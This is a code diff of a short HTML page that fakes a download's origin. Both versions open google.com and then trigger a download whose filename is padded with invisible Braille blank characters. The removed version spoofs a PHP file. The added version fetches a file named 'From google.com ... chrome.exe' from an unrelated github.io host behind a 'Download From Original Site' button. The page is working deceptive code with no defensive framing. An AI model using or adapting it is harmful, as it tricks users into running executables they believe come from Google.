@@ -1,62 +1,38 @@
-<!doctype html>
-<html lang="en">
+<html>
 <head>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Concealed Download</title>
+  <meta charset="utf-8">
   <style>
-    body {
-      height: 100vh;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: sans-serif;
-      background: #fafafa;
-      cursor: pointer;
-    }
-    h1 {
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
       text-align: center;
-      max-width: 420px;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
+  <script>
+    function a(){
+      // Open the first site
+      window.open('https://google.com', 'x');
 
-<h1>
-  Tap anywhere.<br>
-  You will be redirected to Google first, then the file will be downloaded.
-</h1>
+      // Set a timeout to open the second site after 5 seconds
+      setTimeout(function(){
+        // Create a temporary <a> element to trigger the download
+        var link = document.createElement('a');
+        link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀ chrome.exe';
+        link.download = 'From⠀google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
+        link.click(); // Trigger the download
+      }, 5000);
+    }
+  </script>
 
-<script>
-document.addEventListener('click', () => {
-  // Step 1: Redirect to Google first
-  location.href = 'https://google.com'; 
-
-  // Step 2: After 3 seconds, trigger file download
-  setTimeout(() => {
-    // Create file content with URL hidden inside
-    const payload = '<?php echo "This file is from: https://google.com"; ?>';
-
-    // Encode the PHP content to Base64
-    const encodedPayload = btoa(payload);
-
-    // Create a Data URI for the content (this will be treated as a PHP file for download)
-    const dataUri = `data:text/php;base64,${encodedPayload}`;
-
-    // Create an <a> tag to trigger the download
-    const a = document.createElement('a');
-    a.href = dataUri;
-    a.download = 'document.php ⠀⠀⠀⠀⠀ From⠀google.com'; // Filename .php for spoofing
-    document.body.appendChild(a);
-    a.click(); // Trigger the download
-
-    // Clean up after triggering the download
-    setTimeout(() => {
-      a.remove(); // Clean up the <a> element
-    }, 1000);
-  }, 3000); // Wait 3 seconds after redirect to trigger the download
-}, { once: true });
-</script>
-
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
 </body>
 </html>
